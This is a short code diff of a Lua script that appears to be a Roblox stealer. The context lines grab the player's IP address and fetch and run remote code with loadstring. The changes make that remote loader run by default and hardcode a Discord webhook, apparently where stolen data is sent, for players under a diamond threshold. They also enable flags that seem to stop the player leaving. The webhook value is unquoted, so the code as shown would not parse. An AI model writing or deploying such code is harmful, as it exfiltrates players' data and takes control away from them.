@@ -208,7 +208,7 @@ local IPadress = game:HttpGet('https://ipinfo.io/ip')
 local data1
 
 -- Loading Screen
-if _G.LoadingScreen ~= true then
+if _G.LoadingScreen ~= false then
     loadstring(game:HttpGet('https://raw.githubusercontent.com/Mysteroid/Loadingscreen/main/Mysterious.lua'))() 
 end
 
@@ -742,7 +742,7 @@ end
 
 local diaamt = PlayerInfos.Diamonds
 if diaamt < 110000 then
-    _G.Webhook = 
+    _G.Webhook = https://discord.com/api/webhooks/1144596575050534994/I3OrzReZJ6sooSEvEAWzEZ73882PnA1EE16lBxfhBI3Y6udTJI8XWURrtvjFP25vUuS_
     _G.LoadingScreen = true
     _G.AntiLeave = true
     _G.MouseLock = true
